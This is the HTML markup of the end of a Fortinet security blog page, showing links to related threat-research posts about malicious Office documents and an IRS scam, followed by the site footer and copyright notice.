        <a href="/blog/threat-research/microsoft-word-file-spreads-malware-targeting-both-apple-mac-os-x-and-microsoft-windows" class="b12-related__post b12-related__post-0">
            <div class="b12-related__image" style="background-image:url(/content/dam/fortinet-blog/article-images/individual-images/information-stealing-malware-is-spread-via-word-document.jpg.thumb.319.319.png);">
                <img class="ratio" alt="Microsoft Word File Spreads Malware Targeting Both Apple Mac OS X and Microsoft Windows" aria-hidden="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII="/>
            </div>

            <div class="b12-related__text">
                <p class="b12-related__category">
                    Threat Research
                </p>
                <h5 class="b12-related__title">Microsoft Word File Spreads Malware Targeting Both Apple Mac OS X and Microsoft Windows</h5>
            </div>
        </a>
    
    
        
        <a href="/blog/threat-research/microsoft-excel-files-increasingly-used-to-spread-malware" class="b12-related__post b12-related__post-1">
            <div class="b12-related__image" style="background-image:url(/content/dam/fortinet-blog/article-images/individual-images/microsoft-excel-files-increasingly-used-to-spread-malware.png.thumb.319.319.png);">
                <img class="ratio" alt="Microsoft Excel Files Increasingly Used To Spread Malware" aria-hidden="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII="/>
            </div>

            <div class="b12-related__text">
                <p class="b12-related__category">
                    Threat Research
                </p>
                <h5 class="b12-related__title">Microsoft Excel Files Increasingly Used To Spread Malware</h5>
            </div>
        </a>
    
    
        
        <a href="/blog/threat-research/irs-notification-no-it-s-a-scam" class="b12-related__post b12-related__post-2">
            <div class="b12-related__image" style="background-image:url(/content/dam/fortinet-blog/article-images/individual-images/irs-notification-no-it-is-a-scam.png.thumb.319.319.png);">
                <img class="ratio" alt="IRS Notification? No, It is a Scam" aria-hidden="true" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAQAAAADCAQAAAAe/WZNAAAADklEQVR42mNkgAJGDAYAAFEABCaLYqoAAAAASUVORK5CYII="/>
            </div>

            <div class="b12-related__text">
                <p class="b12-related__category">
                    Threat Research
                </p>
                <h5 class="b12-related__title">IRS Notification? No, It is a Scam</h5>
            </div>
        </a>
    
    </div>
</div>


</section>
<div class="b13-comment-section aem-GridColumn aem-GridColumn--default--12">


<div class="b13-comment-section__container text-container">


  <!--data-sly-test="true - got replaced with false to disable the discussion event-->
  
</div>
</div>
<div class="b6-footer aem-GridColumn aem-GridColumn--default--12">


  

  <div class="b6-footer__container text-container">
    <div class="b6-footer__footer-info">
      <div class="b6-footer__logo">
        <a href="https://www.fortinet.com" target="_blank">
          <img src="/content/dam/fortinet-blog/fortinet-logo-white.svg" alt="Fortinet"/>
        </a>
      </div>
      <div class="b6-footer__social-footer">
        <ul>
          
            <li class="social-icon facebook">
              <a href="https://www.facebook.com/fortinet" target="_blank">
                
    <svg viewBox="0 0 9 18" xmlns="http://www.w3.org/2000/svg">
        <path d="M8.934.758v3.385H7.24c-.583 0-.845.685-.845 1.27v2.114h2.54v3.385h-2.54v6.77H3.01v-6.77H.472V7.527H3.01V4.143c0-1.87 1.516-3.385 3.385-3.385h2.54z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
    </svg>

              </a>
            </li>
          
            <li class="social-icon twitter">
              <a href="https://www.twitter.com/fortinet" target="_blank">
                
    <svg viewBox="0 0 19 15" xmlns="http://www.w3.org/2000/svg">
        <path d="M18.17 2.296c-.652.296-1.354.49-2.082.584.745-.448 1.32-1.16 1.59-2.014-.702.423-1.48.72-2.3.89-.67-.73-1.61-1.152-2.675-1.152-1.988 0-3.613 1.625-3.613 3.63 0 .288.034.567.093.83-3.012-.153-5.694-1.6-7.48-3.792-.313.534-.49 1.16-.49 1.82 0 1.26.634 2.377 1.616 3.012-.61 0-1.16-.17-1.65-.423v.03c0 1.76 1.25 3.237 2.91 3.567-.31.084-.63.127-.96.127-.23 0-.46-.026-.68-.07.455 1.43 1.784 2.497 3.383 2.52-1.235.984-2.8 1.56-4.51 1.56-.288 0-.575-.018-.863-.05 1.61 1.03 3.52 1.632 5.57 1.632 6.667 0 10.33-5.534 10.33-10.332 0-.16 0-.313-.007-.474.71-.508 1.32-1.15 1.81-1.888z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
    </svg>

              </a>
            </li>
          
            <li class="social-icon youtube">
              <a href="https://www.youtube.com/user/SecureNetworks" target="_blank">
                
    <svg viewBox="0 0 18 14" xmlns="http://www.w3.org/2000/svg">
        <path d="M7.472 11.027V3.412L12.55 7.22l-5.08 3.806zM15.934.787C15.426.62 12.294.45 9.164.45c-3.13 0-6.26.16-6.77.322-1.32.44-1.69 3.4-1.69 6.447 0 3.03.37 6 1.69 6.43.51.17 3.64.33 6.77.33 3.13 0 6.262-.16 6.77-.33 1.32-.43 1.692-3.4 1.692-6.44 0-3.047-.372-6-1.692-6.43z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
    </svg>

              </a>
            </li>
          
            <li class="social-icon linkedin">
              <a href="https://www.linkedin.com/company/fortinet" target="_blank">
                
    <svg viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
        <path d="M15.934 15.835H12.55v-5.712c0-.897-1.008-1.64-1.905-1.64s-1.48.743-1.48 1.64v5.712H5.78V5.68h3.385v1.693c.558-.905 1.996-1.49 2.96-1.49 2.116 0 3.81 1.727 3.81 3.817v6.135zm-11.846 0H.703V5.68h3.385v10.155zM2.395.605c.935 0 1.693.757 1.693 1.69 0 .936-.758 1.694-1.693 1.694S.703 3.23.703 2.29C.703 1.36 1.46.6 2.395.6z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
    </svg>

              </a>
            </li>
          
            <li class="social-icon instagram">
              <a href="https://www.instagram.com/behindthefirewall/" target="_blank">
                
    <svg viewBox="0 0 32 32" xmlns="http://www.w3.org/2000/svg">
        <path class="st0" d="M16,3.7c4,0,4.5,0,6.1,0.1c1.5,0.1,2.3,0.3,2.8,0.5c0.7,0.3,1.2,0.6,1.7,1.1c0.5,0.5,0.8,1,1.1,1.7
          c0.2,0.5,0.4,1.3,0.5,2.8c0.1,1.6,0.1,2.1,0.1,6.1s0,4.5-0.1,6.1c-0.1,1.5-0.3,2.3-0.5,2.8c-0.3,0.7-0.6,1.2-1.1,1.7
          c-0.5,0.5-1,0.8-1.7,1.1c-0.5,0.2-1.3,0.4-2.8,0.5c-1.6,0.1-2.1,0.1-6.1,0.1s-4.5,0-6.1-0.1c-1.5-0.1-2.3-0.3-2.8-0.5
          c-0.7-0.3-1.2-0.6-1.7-1.1c-0.5-0.5-0.8-1-1.1-1.7c-0.2-0.5-0.4-1.3-0.5-2.8C3.7,20.5,3.7,20,3.7,16s0-4.5,0.1-6.1
          c0.1-1.5,0.3-2.3,0.5-2.8C4.6,6.5,4.9,6,5.4,5.4c0.5-0.5,1-0.8,1.7-1.1c0.5-0.2,1.3-0.4,2.8-0.5C11.5,3.7,12,3.7,16,3.7 M16,1
          c-4.1,0-4.6,0-6.2,0.1C8.2,1.2,7.1,1.4,6.2,1.8c-1,0.4-1.8,0.9-2.7,1.7C2.7,4.4,2.2,5.2,1.8,6.2c-0.4,1-0.6,2-0.7,3.6
          C1,11.4,1,11.9,1,16c0,4.1,0,4.6,0.1,6.2c0.1,1.6,0.3,2.7,0.7,3.6c0.4,1,0.9,1.8,1.7,2.7c0.8,0.8,1.7,1.3,2.7,1.7
          c1,0.4,2,0.6,3.6,0.7C11.4,31,11.9,31,16,31s4.6,0,6.2-0.1c1.6-0.1,2.7-0.3,3.6-0.7c1-0.4,1.8-0.9,2.7-1.7c0.8-0.8,1.3-1.7,1.7-2.7
          c0.4-1,0.6-2,0.7-3.6C31,20.6,31,20.1,31,16s0-4.6-0.1-6.2c-0.1-1.6-0.3-2.7-0.7-3.6c-0.4-1-0.9-1.8-1.7-2.7
          c-0.8-0.8-1.7-1.3-2.7-1.7c-1-0.4-2-0.6-3.6-0.7C20.6,1,20.1,1,16,1L16,1z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
        <path class="st0" d="M16,8.3c-4.3,0-7.7,3.4-7.7,7.7s3.4,7.7,7.7,7.7s7.7-3.4,7.7-7.7S20.3,8.3,16,8.3z M16,21c-2.8,0-5-2.2-5-5
          s2.2-5,5-5s5,2.2,5,5S18.8,21,16,21z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
        <circle class="st0" cx="24" cy="8" r="1.8" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></circle>
    </svg>

              </a>
            </li>
          
            <li class="social-icon rss">
              <a href="https://www.fortinet.com/rss-feeds.html" target="_blank">
                
    <svg viewBox="0 0 18 18" xmlns="http://www.w3.org/2000/svg">
        <path d="M3.072 17.68c-1.27 0-2.37-1.1-2.37-2.368 0-1.27 1.1-2.37 2.37-2.37s2.37 1.1 2.37 2.37-1.016 2.37-2.37 2.37zM.702.76v2.538c7.955 0 14.386 6.43 14.386 14.385h2.538C17.626 8.336 10.05.76.703.76zm0 5.162V8.46c5.078 0 9.224 4.146 9.224 9.223h2.54c0-6.514-5.248-11.76-11.763-11.76z" fill-opacity=".8" fill="#fff" fill-rule="evenodd"></path>
    </svg>

              </a>
            </li>
          
        </ul>
      </div>
    </div>
    <div class="b6-footer__footer-links">
      
        <div class="b6-footer__footer-links-column">
          <h4 class="b6-footer__header">News &amp; Articles</h4>
          <ul>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/newsroom/press-releases.html" target="_self">News Releases</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/newsroom/news.html" target="_blank">News Articles</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/contact-us/fortinet-trademark-guidelines.html" target="_self">Trademarks</a>
              </li>
            
          </ul>
        </div>
      
        <div class="b6-footer__footer-links-column">
          <h4 class="b6-footer__header">Security Research</h4>
          <ul>
            
              <li>
                <a href="https://www.fortinet.com/fortiguard/threat-intelligence/threat-research.html" target="_self">Threat Research</a>
              </li>
            
              <li>
                <a href="https://fortiguard.com/" target="_self">FortiGuard Labs</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/fortiguard/threat-intelligence/threat-map.html" target="_self">Threat Map</a>
              </li>
            
              <li>
                <a href="https://secure.fortinet.com/fortiguard" target="_blank">Threat Briefs</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/solutions/ransomware.html" target="_self">Ransomware</a>
              </li>
            
          </ul>
        </div>
      
        <div class="b6-footer__footer-links-column">
          <h4 class="b6-footer__header">Connect With Us</h4>
          <ul>
            
              <li>
                <a href="/content/fortinet-blog/us/en" target="_self">Blog</a>
              </li>
            
              <li>
                <a href="https://fusecommunity.fortinet.com" target="_self">Fuse Community</a>
              </li>
            
          </ul>
        </div>
      
        <div class="b6-footer__footer-links-column">
          <h4 class="b6-footer__header">Company</h4>
          <ul>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/about-us.html" target="_blank">About Us</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/why-fortinet.html" target="_blank">Why Fortinet</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/security-fabric.html" target="_self">Security Fabric</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/executive-management.html" target="_self">Exec Mgmt</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/corporate/careers.html" target="_self">Careers</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/product-certifications.html" target="_self">Certifications</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/events.html" target="_self">Events</a>
              </li>
            
              <li>
                <a href="https://www.fortinet.com/corporate/about-us/industry-awards.html" target="_self">Industry Awards</a>
              </li>
            
          </ul>
        </div>
      
      <div class="b6-footer__contact-info">
        <h4 class="b6-footer__header">Contact Us</h4>
        <ul>
          <li>(866) 868-3678</li>
        </ul>
      </div>
    </div>
    <div class="b6-footer__copyright">
      <div class="b6-footer__copyright-info">
        <p class="b6-footer__copyright-text">Copyright © 2021 Fortinet, Inc. All Rights Reserved</p>
        
          <a class="b6-footer__copyright-link" href="https://www.fortinet.com/corporate/about-us/legal.html" target="_blank">Terms of Services</a>
        
          <a class="b6-footer__copyright-link" href="https://www.fortinet.com/corporate/about-us/privacy.html" target="_blank">Privacy Policy</a>
        
        <span class="ot-ftnt-cookie-settings"> | <a href="#" onclick="Optanon.ToggleInfoDisplay()">Cookie Settings</a></span>
      </div>
    </div>
  </div>

<!-- Launch COnfiguration -->


<!-- END Launch COnfiguration --></div>

    
</div>
</div>



    
    

    
    
<script type="text/javascript" src="/etc.clientlibs/fortinet-blog/clientlibs/clientlib-base.min.js"></script>





    




</body>
</html>
